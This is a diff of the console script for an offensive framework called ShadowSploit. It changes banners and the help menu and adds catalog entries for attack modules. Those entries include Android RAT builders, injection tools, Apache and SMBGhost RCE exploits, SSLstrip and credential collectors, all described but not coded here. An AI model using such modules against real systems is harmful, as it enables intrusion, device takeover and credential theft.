@@ -1,7 +1,6 @@
 # DISCLAMER! : Every risk you done with this tool, is on your own sholder.
 # I know This tool has a long code and if you want to change the code, you may deal with error!.
 # This tool is created for hackers and pen testers.
-# imports
 
 import os
 import time
@@ -48,147 +47,66 @@ signal.signal(signal.SIGINT, signal_handler)
 
 def start():
     os.system('clear')
-    print("starting sc console...")
+    print("Starting scconsole...")
     time.sleep(0.3)
     os.system('clear')
-    print("starting Sc console...")
+    print("Starting scconsole*..")
     time.sleep(0.3)
     os.system('clear')
-    print("starting sC console...")
+    print("Starting scconsole**.")
     time.sleep(0.3)
     os.system('clear')
-    print("starting sc Console...")
+    print("Starting scconsole***")
     time.sleep(0.3)
-    os.system('clear')
-    print("starting sc cOnsole...")
-    time.sleep(0.3)
-    os.system('clear')
-    print("starting sc coNsole...")
-    time.sleep(0.3)
-    os.system('clear')
-    print("starting sc conSole...")
-    time.sleep(0.3)
-    os.system('clear')
-    print("starting sc consOle...")
-    time.sleep(0.3)
-    os.system('clear')
-    print("starting sc consoLe...")
-    time.sleep(0.3)
-    os.system('clear')
-    print("starting sc consolE...")
-    time.sleep(0.3)
-    os.system('clear')
-    print("starting sc console...")
-    time.sleep(0.3)
-    os.system('clear')
 
 
 def Menu():
     os.system('clear')
-    list = [color.red + """
- ▄▀▀▀▀▄  ▄▀▄▄▄▄  
-█ █   ▐ █ █    ▌ 
-   ▀▄   ▐ █      
-▀▄   █    █      
- █▀▀▀    ▄▀▄▄▄▄▀ 
- ▐      █     ▐  
-        ▐        
+    list = [color.red + """         
+.------..------..------..------..------..------..------..------.
+|S.--. ||C.--. ||S.--. ||P.--. ||L.--. ||O.--. ||I.--. ||T.--. |
+| :(): || :(): || (\/) || (\/) || (\/) || :/\: || :/\: || :(): |
+| ()() || ()() || :\/: || :\/: || :\/: || :\/: || :\/: || ()() |
+| '--'S|| '--'C|| '--'S|| '--'P|| '--'L|| '--'O|| '--'I|| '--'T|
+`------'`------'`------'`------'`------'`------'`------'`------'
+                         ShadowSploit
+""",
+color.logging + """
+             __
+          _.-'.-'-.__
+       .-'.       '-.'-._ __.--._
+-..'\,-,/..-  _         .'   \   '----._
+ ). /_ _\' ( ' '.         '-  '/'-----._'-.__
+ '..'     '-r   _      .-.       '-._ \\
+ '.\. Y .).'       ( .'  .      .\          '\'.
+ .-')'|'/'-.        \)    )      '',_      _.c_.\\
+   .<, ,>.          |   _/\        . ',   :   : \\
+  .' \_/ '.        /  .'   |          '.     .'  \)
+                  / .-'    '-.        : \   _;   ||
+                 / /    _     \_      '.'\ ' /   ||
+                /.'   .'        \_      .|   \   \|
+               / /   /      __.---'      '._  ;  ||
+              /.'  _:-.____< ,_           '.\ \  ||
+             // .-'     '-.__  '-'-\_      '.\/_ \|
+            ( };====.===-==='        '.    .  \\: \\
+             \\ '._        /          :   ,'   )\_ \\
+              \\   '------/            \ .    /   )/
+               \|        _|             )Y    |   /
+                \\      \             .','   /  ,/
+                 \\    _/            /     _/
+                  \\   \           .'    .'
+                   '| '1          /    .'
+                     '. \        |:    /
+                       \ |       /', .'
+                        \(      ( ;z'
+                         \:      \ '(_
+                          \_,     '._ '-.___
+                                      '-' -.\\
 
- ▄▀▀▀█▄    ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄    ▄▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄▀▀▀▄  ▄▀▀▄ █ 
-█  ▄▀  ▀▄ █   █   █ ▐ ▄▀ ▀▄ █  █ ▀  █ ▐  ▄▀   ▐ █   █    ▐  █ █      █ █   █   █ █  █ ▄▀ 
-▐ █▄▄▄▄   ▐  █▀▀█▀    █▄▄▄█ ▐  █    █   █▄▄▄▄▄  ▐  █        █ █      █ ▐  █▀▀█▀  ▐  █▀▄  
- █    ▐    ▄▀    █   ▄▀   █   █    █    █    ▌    █   ▄    █  ▀▄    ▄▀  ▄▀    █    █   █ 
- █        █     █   █   ▄▀  ▄▀   ▄▀    ▄▀▄▄▄▄      ▀▄▀ ▀▄ ▄▀    ▀▀▀▀   █     █   ▄▀   █  
-█         ▐     ▐   ▐   ▐   █    █     █    ▐            ▀             ▐     ▐   █    ▐  
-▐                           ▐    ▐     ▐                                         ▐       
-""",
-color.green + """
-              ┬                                    ┬
-              │────────────────────────────────────│
-              o                                    o
-              ┬              ┌─┐┌─┐                ┬
-              │              └─┐│                  │
-              o              └─┘└─┘                o
-              ┬    ┌─┐┬─┐┌─┐┌┬┐┌─┐┬ ┬┌─┐┬─┐┬┌─     ┬ 
-              │    ├┤ ├┬┘├─┤│││├┤ ││││ │├┬┘├┴┐     │ 
-              o    └  ┴└─┴ ┴┴ ┴└─┘└┴┘└─┘┴└─┴ ┴     o 
-              ┬                                    ┬
-              │────────────────────────────────────│
-              o                                    o
-""",
-color.warning + """
-                    .▄▄ ·  ▄▄·                                 
-                    ▐█ ▀. ▐█ ▌▪                                
-                    ▄▀▀▀█▄██ ▄▄                                
-                    ▐█▄▪▐█▐███▌                                
-                     ▀▀▀▀ ·▀▀▀                                 
-    ·▄▄▄▄▄▄   ▄▄▄· • ▌ ▄ ·. ▄▄▄ .▄▄▌ ▐ ▄▌      ▄▄▄  ▄ •▄       
-    ▐▄▄·▀▄ █·▐█ ▀█ ·██ ▐███▪▀▄.▀·██· █▌▐█▪     ▀▄ █·█▌▄▌▪      
-    ██▪ ▐▀▀▄ ▄█▀▀█ ▐█ ▌▐▌▐█·▐▀▀▪▄██▪▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐▀▀▄·      
-    ██▌.▐█•█▌▐█ ▪▐▌██ ██▌▐█▌▐█▄▄▌▐█▌██▐█▌▐█▌.▐▌▐█•█▌▐█.█▌      
-    ▀▀▀ .▀  ▀ ▀  ▀ ▀▀  █▪▀▀▀ ▀▀▀  ▀▀▀▀ ▀▪ ▀█▄▀▪.▀  ▀·▀  ▀      
+                    ShadowSploit
 """,
 color.blue + """
-                     ______
-             \    .-        -. 
-     __<@\_______/            \__________________________________
-  (I)___|________}  .-.  .-.  ,{____framework___________________/
-       <@/      | )(_S/  \C_)( |  
-                |/     /\     \|     / 
-                <__    ^^    __>
-                 \__|IIIIII|__/
-                  \ \      / / 
-                   \ IIIIII /
-                    -------- 
-""",
-color.red + """
-                                              .------..------.          
- .-.  .-.  .-.  .-.  .-.  .-.  .-.  .-.  .-.  |S.--. ||C.--. |          
-((5))((5))((5))((5))((5))((5))((5))((5))((5)) | :/\: || :/\: |          
- '-.-.'-.-.'-.-.'-.-.'-.-.'-.-.'-.-.'-.-.'-.-.| :\/: || :\/: |          
-  ((1))((1))((1))((1))((1))((1))((1))((1))((1)) '--'S|| '--'C|          
-   '-'  '-'  '-'  '-'  '-'  '-'  '-'  '-'  '-'`------'`------'          
-.------..------..------..------..------..------..------..------..------.
-|F.--. ||R.--. ||A.--. ||M.--. ||E.--. ||W.--. ||O.--. ||R.--. ||K.--. |
-| :(): || :(): || (\/) || (\/) || (\/) || :/\: || :/\: || :(): || :/\: |
-| ()() || ()() || :\/: || :\/: || :\/: || :\/: || :\/: || ()() || :\/: |
-| '--'F|| '--'R|| '--'A|| '--'M|| '--'E|| '--'W|| '--'O|| '--'R|| '--'K|
-`------'`------'`------'`------'`------'`------'`------'`------'`------'
-""",
-"""
-000000000000""" + color.warning + """1      1""" + color.white + """0000000000000000000000000000
-       000000""" + color.warning + """1""" + color.white + """0000""" + color.warning + """1""" + color.white + """0000000000000000
-  000""" + color.warning + """1""" + color.white + """0000000""" + color.warning + """111111""" + color.white + """00000000""" + color.warning + """1""" + color.white + """
-     """ + color.warning + """11""" + color.white + """0000""" + color.warning + """1111111111""" + color.white + """00000""" + color.warning + """11""" + color.white + """
-    00""" + color.warning + """11""" + color.white + """00""" + color.warning + """111111111111""" + color.white + """000""" + color.warning + """11""" + color.white + """000
-    000""" + color.warning + """1111111111111111111""" + color.white + """000000000000
-0000000  """ + color.red + """CVE-2022-24521""" + color.white + """  000000000000000000000000000000000000000
-   00000""" + color.warning + """11111111111111111""" + color.white + """000
-00000000""" + color.warning + """11111111111111111""" + color.white + """000000000
-   0000""" + color.warning + """1111111111111111111""" + color.white + """000000
-  0000""" + color.warning + """11""" + color.white + """00""" + color.warning + """1111111111111""" + color.white + """00""" + color.warning + """11""" + color.white + """000000000000
-00000""" + color.warning + """11""" + color.white + """000000""" + color.warning + """1111111""" + color.white + """000000""" + color.warning + """11""" + color.white + """000000
-   00""" + color.warning + """1""" + color.white + """000000000000000000000""" + color.warning + """1""" + color.white + """000000000000000000
-""",
-color.warning + color.red + color.green + """
-                          (                                     
-                          )\ )   (                              
-                         (()/(   )\                             
-                          /(_))(((_)                            
-                         (_))  )\___                            
-                         / __|((/ __|                           
-                         \__ \ | (__                            
- (     (                *|___/  \___|          )   (         )  
- )\ )  )\ )    (      (  `         (  (     ( /(   )\ )   ( /(  
-(()/( (()/(    )\     )\))(   (    )\))(   ')\()) (()/(   )\()) 
- /(_)) /(_))((((_)(  ((_)()\  )\  ((_)()\ )((_)\   /(_))|((_)\  
-(_))_|(_))   )\ _ )\ (_()((_)((_) _(())\_)() ((_) (_))  |_ ((_) 
-| |_  | _ \  (_)_\(_)|  \/  || __|\ \((_)/ // _ \ | _ \ | |/ /  
-| __| |   /   / _ \  | |\/| || _|  \ \/\/ /| (_) ||   /   ' <   
-|_|   |_|_\  /_/ \_\ |_|  |_||___|  \_/\_/  \___/ |_|_\  _|\_\                                                               
-""",
-color.blue + """
-                                        SC       
+                                    ShadowSploit       
                                          *       
                                                  
                                         *        
@@ -208,17 +126,49 @@ color.blue + """
                                                  
                                                  
                                          *     * 
+""",
+color.red + """
+.dP"Y8 88  88    db    8888b.   dP"Yb  Yb        dP .dP"Y8 88""Yb 88      dP"Yb  88 888888 
+`Ybo." 88  88   dPYb    8I  Yb dP   Yb  Yb  db  dP  `Ybo." 88__dP 88     dP   Yb 88   88   
+o.`Y8b 888888  dP__Yb   8I  dY Yb   dP   YbdPYbdP   o.`Y8b 88'''  88  .o Yb   dP 88   88   
+8bodP' 88  88 dP''''Yb 8888Y"   YbodP     YP  YP    8bodP' 88     88ood8  YbodP  88   88   
+""",
+"""
+                                       """ + color.red + """ ___
+                                        \__\ 
+                                            \ """ + color.white + """
+                                       ShadowSploit
+                                             
+                                         ,~'''~.
+                                      ,-/       \-.
+                                    .' '`._____.'` `. 
+                                    `-._         _,-'
+                                      _|`--...--'|_     
+                                  ___/\|         |/\___
+                                """ + color.green + """ /     \\\_______//     \\
+                                /       \       /       \\""" + color.white + """
+                            -----------------------------------
+                            |            """ + color.red + """ ___""" + color.white + """                 |
+                            |             """ + color.red + """\__\ """ + color.white + """               |
+                            |                 """ + color.red + """\ """ + color.white + """              |
+                      (o)   |                                 |
+                       |    |    [|] [|] [] []                |
+                        \   |     |   |                       |__
+                         \  ------|---|----||||----------------  |
+                          \       | |_|[|]_||||__________________|
+                           \______|   |/  _||||_
+                                         /______\\
 """]
     random_banner = random.choice(list)
     print(random_banner)
     print()
     print()
     print()
-    print(color.white + "        +[ " + color.red + "sc_framework v2.0" + color.white + "                           ]+")
-    print("        -* 84 exploits - 41 auxiliary - 25 cve exploits *-")
-    print("        -* 31 payloads *-")
+    print(color.white + "        *[ " + color.red + "ShadowSploit v2.1" + color.white + "                             ]*")
+    print("        *[ 102 exploits - 47 auxiliary - 27 cve exploits ]*")
+    print("        *[ 53 payloads - 5 buffer overflow               ]*")
     print()
-    print("sc_framework tip: type '" + color.blue + "help" + color.white + "' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
+    print("shadowsploit tip: type '" + color.blue + "help" + color.white + "' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
     print()
     Console()
 
@@ -228,29 +178,19 @@ def Console():
     logs.append(scconsole + '\n')
     readline.add_history(scconsole)
     save_history()
-    if scconsole == "help":
+    if scconsole == "help" or scconsole == "h":
         print("""
-FULL HELP MENU: 
+HELP MENU: 
 
 help ---> to see this help menu.
 clear ---> to clear the screen.
 use <exploit> ---> to use the exploit.
 search ---> to see the search options.
 exit ---> to exit from sc-console.
-show payloads ---> to see avalable payloads in sc-framework.
+show payloads ---> to see avalable payloads in shadowsploit.
 use system commands ---> to use system tools and commands 3 times, to come back here use (back to sc-console).
 db_scscanner ---> normal scanner of scconsole, type 'db_scscanner -h' to see help menu of db_scscanner.
-""")
-    elif scconsole == "h":
-        print("""
-HELP MENU: 
-
-help ---> to see the full help menu.
-
-clear ---> to clear the screen.
-search ---> to see the search options.
-exit ---> to exit from sc-console.
-use system commands ---> to use system tools and commands 4 times, to come back here use (back to sc-console).
+gui ---> runs the scconsole GUI version (in GUI, you can't use all exploits!).
 """)
     elif scconsole == "show options":
         print("""
@@ -261,8 +201,8 @@ PLEASE CHOOSE AN EXPLOIT THEN TYPE THIS!
     elif scconsole == "search" or scconsole == "search ":
         print("""
 search [ exploits | exploit | windows | site | cve-exploits ]
-       [ osx | linux | multi | server | dos | php           ]
-       [ auxiliary | sniffer | scanner                      ]
+       [ osx | linux | multi | server | dos | php | android ]
+       [ auxiliary | sniffer | scanner | buffer_overflow    ]
 """)
     elif scconsole == "search exploits":
         print("""
@@ -284,8 +224,6 @@ _______|
 |- """ + color.red + """multi/ftp-login-test""" + color.white + """                                24/01/19       for login on port 21 or 20 ftp port.
 |- """ + color.red + """site/http-login-test""" + color.white + """                                24/01/19       for login on port 80 http port.
 |- """ + color.red + """exploit/reverse-shell""" + color.white + """                               24/01/20       for get a reverse shell by sending a link.
-|- """ + color.red + """exploit/handler/handler""" + color.white + """                             24/01/22       for listen on the target to open the exploit2.php.
-|- """ + color.red + """exploit/handler/listining""" + color.white + """                           24/01/22       for listen on the target to open the exploit.php.
 |- """ + color.red + """exploit/cve-2023-22518/cve-2023-22518""" + color.white + """               23/09/29       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.
 |- """ + color.red + """exploit/cve-2023-22518/vuln-test-for-cve-2023-22518""" + color.white + """ 23/09/29       allow to test the target to find cve-2023-22518 vulnerabilitie.
 |- """ + color.red + """dos/DD_D_Attack""" + color.white + """                                     25/02/01       for DoS and DDoS Attack (If your Internet is slow, that's gonna works slowly!).
@@ -353,6 +291,26 @@ _______|
 |- """ + color.red + """site/Bludit""" + color.white + """                                         20/10/23       Bludit 3.9.2 - Auth Bruteforce Bypass.
 |- """ + color.red + """windows/ShellSend""" + color.white + """                                   25/05/21       Sends a buffer overflow to your tagret and then gives you a reverse shell access.
 |- """ + color.red + """site/shell_inject""" + color.white + """                                   25/05/26       Try some OS Command Injection payloads to see of there is any OS Command Injection in the web application, and gives you the shell.
+|- """ + color.red + """android/android_reverse_tcp""" + color.white + """                          25/06/02       Creates a RAT file with scRAT tool for an andorid device, then start a listener(but just you need to do is to send the RAT to your target!).
+|- """ + color.red + """android/GetShell""" + color.white + """                                    25/06/15       runs a listener with scRAT to get a shell from an android device.
+|- """ + color.red + """android/BuildShell""" + color.white + """                                  25/06/15       Creates a apk file to get a shell from an android.
+|- """ + color.red + """site/os_finder""" + color.white + """                                      25/06/29       Trys to find the target website OS from header and robots.txt .
+|- """ + color.red + """site/dir_enum""" + color.white + """                                       25/06/29       Trys to brute-force directorys and shows you with status code.
+|- """ + color.red + """site/sql_injector""" + color.white + """                                   25/06/29       This module will try to find a sql injection after that if trys to extract the tables and after that trys to extract columns.
+|- """ + color.red + """site/cmd_injector""" + color.white + """                                   25/06/29       Trys to find OS Command injection then if you want it will try to give a shell access to target.
+|- """ + color.red + """site/lfi_rfi_scanner""" + color.white + """                                25/06/29       It will scan for LFI and RFI vulnerability.
+|- """ + color.red + """site/xss_scan""" + color.white + """                                       25/06/29       Try to find a XSS vulnerability on that website page.
+|- """ + color.red + """site/upload_finder""" + color.white + """                                  25/06/29       Try to find an upload page on that website.
+|- """ + color.red + """multi/rce_server""" + color.white + """                                    25/07/05       This module is listener for RCE(Remote Command Execution) as server(server means attacker).
+|- """ + color.red + """Exel_Password_Recovery""" + color.white + """                              18/12/18       Exel Password Recovery 8.2.0.0 - Local Buffer Overflow Denial of Service.
+|- """ + color.red + """scanner/WAF_Checker""" + color.white + """                                 25/07/09       This module will try some payloads and other thinks to find the target WAF(Web Application Firewall) type and version.
+|- """ + color.red + """multi/listener""" + color.white + """                                      25/07/10       This module will start a listener.
+|- """ + color.red + """scanner/csrf_token_detect""" + color.white + """                           25/07/12       This module will detect if target using csrf token.
+|- """ + color.red + """windows/windows_webdav_url_rce_cve_2025_33053""" + color.white + """       25/07/19       This module allows unauthenticated attackers to execute arbitrary commands on the target system via a Maliciously Crafted WebDav request containing a vulnerable url path.
+|- """ + color.red + """site/cve_2021_41773_apache_rce""" + color.white + """                      25/07/19       This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49, it abuse a path traversal flaw in the url let attacker to access arbitrary files, under certain, execute arbitrary commands via CGI.
+|- """ + color.red + """site/cve_2021_42013_apache_bypass_rce""" + color.white + """               25/09/20       This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49 and 2.4.50, triggered via path traversal and command injection. it is a bypass and upgrade of the cve_2021_41773 vulnerability.
+|- """ + color.red + """site/file_list_wordpress_pligun_4-2-2""" + color.white + """               25/07/22       Simple File List WordPress Plugin 4.2.2 - File Upload to RCE.
+|- """ + color.red + """windows/smbghost""" + color.white + """                                    25/07/23       A critical pre-auth (RCE) vulnerability in the SMBv3.1.1 protocol on Windows 10/2019.
 """)
     elif scconsole == "search exploit":
         print("""
@@ -363,28 +321,29 @@ _______|
 |- """ + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """                             24/01/14       for scanning target and finds vulnerabilite on target machine.
 |- """ + color.red + """exploit/ssh-version""" + color.white + """                                          24/01/18       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
 |- """ + color.red + """exploit/reverse-shell""" + color.white + """                                        24/01/20       for get a reverse shell by sending a link.
-|- """ + color.red + """exploit/handler/handler""" + color.white + """                                      24/01/22       for listen on the target to open the exploit2.php.
-|- """ + color.red + """exploit/handler/listining""" + color.white + """                                    24/01/22       for listen on the target to open the exploit.php.
 |- """ + color.red + """exploit/cve-2023-22518/cve-2023-22518""" + color.white + """                        23/09/29       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.
 |- """ + color.red + """exploit/cve-2023-22518/vuln-test-for-cve-2023-22518""" + color.white + """          23/09/29       allow to test the target to find cve-2023-22518 vulnerabilitie.
 |- """ + color.red + """exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti""" + color.white + """    25/01/02       This vulnerability enables attackers to upload malicious files (e.g., web shells) and execute commands on the target system with elevated privileges.
 """)
     elif scconsole == "search windows":
         print("""
-    Exploits                              When created?        Discrepstion 
+    Exploits                                  When created?        Discrepstion 
        |
 _______|
-|- """ + color.red + """windows/PDF-exploit""" + color.white + """                       24/01/18       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
-|- """ + color.red + """windows/ftp-login-test""" + color.white + """                    24/01/19       for login on port 21 or 20 ftp port.
-|- """ + color.red + """windows/java-rhino""" + color.white + """                        24/01/12       for excuteshellcommand http port.
-|- """ + color.red + """windows/ms17_010""" + color.white + """                          24/01/13       for brute force windows smb port.
-|- """ + color.red + """windows/ssh-login-test""" + color.white + """                    24/01/11       for brute forcing ssh port.
-|- """ + color.red + """windows/7-zip_cve-2025-0411""" + color.white + """               25/02/04       This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.
-|- """ + color.red + """windows/MS04-007_LSASS-exe_Pro_Remote_DoS""" + color.white + """ 04/02/14       Microsoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007).
-|- """ + color.red + """windows/shell-storm""" + color.white + """                       25/02/23       trys to send buffer overflow and take a shellcode.
-|- """ + color.red + """windows/reverse_tcp""" + color.white + """                       25/02/28       send a payload to the target machine, if success, connect back to attacker machine.
-|- """ + color.red + """windows/ms08_067_netapi""" + color.white + """                   25/02/26       MS08-067 vulnerability in the NetAPI32 service on Windows XP and Server 2003. It exploits a stack-based buffer overflow in the NetApi32.dll library.
-|- """ + color.red + """windows/ShellSend""" + color.white + """                         25/05/21       Sends a buffer overflow to your tagret and then gives you a reverse shell access.
+|- """ + color.red + """windows/PDF-exploit""" + color.white + """                           24/01/18         for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
+|- """ + color.red + """windows/ftp-login-test""" + color.white + """                        24/01/19         for login on port 21 or 20 ftp port.
+|- """ + color.red + """windows/java-rhino""" + color.white + """                            24/01/12         for excuteshellcommand http port.
+|- """ + color.red + """windows/ms17_010""" + color.white + """                              24/01/13         for brute force windows smb port.
+|- """ + color.red + """windows/ssh-login-test""" + color.white + """                        24/01/11         for brute forcing ssh port.
+|- """ + color.red + """windows/7-zip_cve-2025-0411""" + color.white + """                   25/02/04         This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.
+|- """ + color.red + """windows/MS04-007_LSASS-exe_Pro_Remote_DoS""" + color.white + """     04/02/14         Microsoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007).
+|- """ + color.red + """windows/shell-storm""" + color.white + """                           25/02/23         trys to send buffer overflow and take a shellcode.
+|- """ + color.red + """windows/reverse_tcp""" + color.white + """                           25/02/28         send a payload to the target machine, if success, connect back to attacker machine.
+|- """ + color.red + """windows/ms08_067_netapi""" + color.white + """                       25/02/26         MS08-067 vulnerability in the NetAPI32 service on Windows XP and Server 2003. It exploits a stack-based buffer overflow in the NetApi32.dll library.
+|- """ + color.red + """windows/ShellSend""" + color.white + """                             25/05/21         Sends a buffer overflow to your tagret and then gives you a reverse shell access.
+|- """ + color.red + """Exel_Password_Recovery""" + color.white + """                        18/12/18         Exel Password Recovery 8.2.0.0 - Local Buffer Overflow Denial of Service.
+|- """ + color.red + """windows/windows_webdav_url_rce_cve_2025_33053""" + color.white + """ 25/07/19         This module allows unauthenticated attackers to execute arbitrary commands on the target system via a Maliciously Crafted WebDav request containing a vulnerable url path.
+|- """ + color.red + """windows/smbghost""" + color.white + """                              25/07/23         A critical pre-auth (RCE) vulnerability in the SMBv3.1.1 protocol on Windows 10/2019.
 """)
     elif scconsole == "search site":
         print("""
@@ -409,6 +368,16 @@ _______|
 |- """ + color.red + """site/Apache_commons_text_RCE""" + color.white + """           25/04/28        This exploit demonstrates an RCE vector via POST data, differing.
 |- """ + color.red + """site/Bludit""" + color.white + """                            20/10/23        Bludit 3.9.2 - Auth Bruteforce Bypass.
 |- """ + color.red + """site/shell_inject""" + color.white + """                      25/05/26        Try some OS Command Injection payloads to see of there is any OS Command Injection in the web application, and gives you the shell.
+|- """ + color.red + """site/os_finder""" + color.white + """                         25/06/29        Trys to find the target website OS from header and robots.txt .
+|- """ + color.red + """site/dir_enum""" + color.white + """                          25/06/29        Trys to brute-force directorys and shows you with status code.
+|- """ + color.red + """site/sql_injector""" + color.white + """                      25/06/29        This module will try to find a sql injection after that if trys to extract the tables and after that trys to extract columns.
+|- """ + color.red + """site/cmd_injector""" + color.white + """                      25/06/29        Trys to find OS Command injection then if you want it will try to give a shell access to target.
+|- """ + color.red + """site/lfi_rfi_scanner""" + color.white + """                   25/06/29        It will scan for LFI and RFI vulnerability.
+|- """ + color.red + """site/xss_scan""" + color.white + """                          25/06/29        Try to find a XSS vulnerability on that website page.
+|- """ + color.red + """site/upload_finder""" + color.white + """                     25/06/29        Try to find an upload page on that website.
+|- """ + color.red + """site/cve_2021_41773_apache_rce""" + color.white + """         25/07/19        This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49, it abuse a path traversal flaw in the url let attacker to access arbitrary files, under certain, execute arbitrary commands via CGI.
+|- """ + color.red + """site/cve_2021_42013_apache_bypass_rce""" + color.white + """  25/09/20        This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49 and 2.4.50, triggered via path traversal and command injection. it is a bypass and upgrade of the cve_2021_41773 vulnerability.
+|- """ + color.red + """site/file_list_wordpress_pligun_4-2-2""" + color.white + """  25/07/22        Simple File List WordPress Plugin 4.2.2 - File Upload to RCE.
 """)
     elif scconsole == "search cve-exploits":
         print("""
@@ -437,6 +406,8 @@ _______|
 |- """ + color.red + """tools/cve-exploits/DocsGPT_0-12-0_RCE""" + color.white + """                  25/04/09       DocsGPT 0.12.0 - Remote Code Execution.
 |- """ + color.red + """tools/cve-exploits/cve-2025-0282""" + color.white + """                       25/04/18       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).
 |- """ + color.red + """tools/cve-exploits/wordpress-depicter-plugin-3-6-1""" + color.white + """     25/05/09       WordPress Depicter Plugin 3.6.1 - SQL Injection.
+|- """ + color.red + """tools/cve-exploits/cve_2021_41773_apache_rce""" + color.white + """           25/07/19       This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49, it abuse a path traversal flaw in the url let attacker to access arbitrary files, under certain, execute arbitrary commands via CGI.
+|- """ + color.red + """tools/cve-exploits/cve_2021_42013_apache_bypass_rce""" + color.white + """    25/09/20       This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49 and 2.4.50, triggered via path traversal and command injection. it is a bypass and upgrade of the cve_2021_41773 vulnerability.
         
 You can't run these exploits from here, you need to run them from """,os.getcwd(),"""/tools/cve-exploits/
         
@@ -460,6 +431,8 @@ _______|
 |- """ + color.red + """multi/cve-2025-0282""" + color.white + """                                 25/04/18       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).
 |- """ + color.red + """multi/generate_backdoor""" + color.white + """                             25/04/24       This exploit uses scpgenerator to generate a backdoor for you.
 |- """ + color.red + """multi/nc-listener""" + color.white + """                                   25/04/25       starts a listener with netcat (netcat reqires!).
+|- """ + color.red + """multi/rce_server""" + color.white + """                                    25/07/05       This module is listener for RCE(Remote Command Execution) as server(server means attacker).
+|- """ + color.red + """multi/listener""" + color.white + """                                      25/07/10       This module will start a listener.
 """)
     elif scconsole == "search osx":
         print("""
@@ -559,37 +532,65 @@ _______|
 |- """ + color.red + """auxiliary/hashdetect""" + color.white + """                                25/05/23       Try to find the hash type that you give.
 |- """ + color.red + """auxiliary/http-bruteforce""" + color.white + """                           25/05/25       Try to brute-force http and show you the result with response and length.
 |- """ + color.red + """auxiliary/find-login-fields""" + color.white + """                         25/05/25       Try to detect login form fields and show to you.
+|- """ + color.red + """auxiliary/xss_scanner""" + color.white + """                               25/06/08       Test the target url, find a form(like search form or else), then test the xss payloads from the wordlist you give.
+|- """ + color.red + """auxiliary/sql-injection-db-tbl-c""" + color.white + """                    25/06/28       Test if there is a sql injection vulnerability, then trys to take out databses, tables, and columns.
+|- """ + color.red + """auxiliary/xss_tester""" + color.white + """                                25/06/28       Test some XSS payloads to see if there is any XSS vulnerability.
+|- """ + color.red + """auxiliary/ftp_brute_force""" + color.white + """                           25/07/05       This module trys to brute force ftp with the username and password list you specified.
+|- """ + color.red + """auxiliary/https_brute_force""" + color.white + """                         25/07/12       This module will try to brute force https login page.
+|- """ + color.red + """auxiliary/mikrotik-routeros-7-19-1-xss""" + color.white + """              25/07/16       MikroTik RouterOS 7.19.1 - Reflected XSS.
 """)
     elif scconsole == "search sniffer":
         print("""
     Exploits                                        When created?        Discrepstion 
        |
 _______|
-|-""" + color.red + """sniffer/sniffer""" + color.white + """                                     25/03/13       This module captures network traffic and logs it to a file.
-|-""" + color.red + """sniffer/credential-collector""" + color.white + """                        25/03/14       This module collects cleartext credentials, such as passwords, from network traffic.
-|-""" + color.red + """sniffer/inspect_traffic""" + color.white + """                             25/03/16       This module analyzes network traffic and identifies potential vulnerabilities.
-|-""" + color.red + """sniffer/SSLstrip""" + color.white + """                                    25/03/17       This module performs SSL stripping, which modifies HTTPS traffic to remove encryption and capture cleartext credentials.
-|-""" + color.red + """sniffer/tcpdump-sniffer""" + color.white + """                             25/03/18       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
-|-""" + color.red + """sniffer/ettercap-sniffer""" + color.white + """                            25/03/18       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
-|-""" + color.red + """sniffer/tshark-sniffer""" + color.white + """                              25/03/18       This module starts a tshark sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
-|-""" + color.red + """sniffer/ble-scanner""" + color.white + """                                 25/04/04       scans bluetooths around you (sudo permission needed!).
+|- """ + color.red + """sniffer/sniffer""" + color.white + """                                     25/03/13       This module captures network traffic and logs it to a file.
+|- """ + color.red + """sniffer/credential-collector""" + color.white + """                        25/03/14       This module collects cleartext credentials, such as passwords, from network traffic.
+|- """ + color.red + """sniffer/inspect_traffic""" + color.white + """                             25/03/16       This module analyzes network traffic and identifies potential vulnerabilities.
+|- """ + color.red + """sniffer/SSLstrip""" + color.white + """                                    25/03/17       This module performs SSL stripping, which modifies HTTPS traffic to remove encryption and capture cleartext credentials.
+|- """ + color.red + """sniffer/tcpdump-sniffer""" + color.white + """                             25/03/18       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
+|- """ + color.red + """sniffer/ettercap-sniffer""" + color.white + """                            25/03/18       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
+|- """ + color.red + """sniffer/tshark-sniffer""" + color.white + """                              25/03/18       This module starts a tshark sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
+|- """ + color.red + """sniffer/ble-scanner""" + color.white + """                                 25/04/04       scans bluetooths around you (sudo permission needed!).
 """)
     elif scconsole == "search scanner":
         print("""
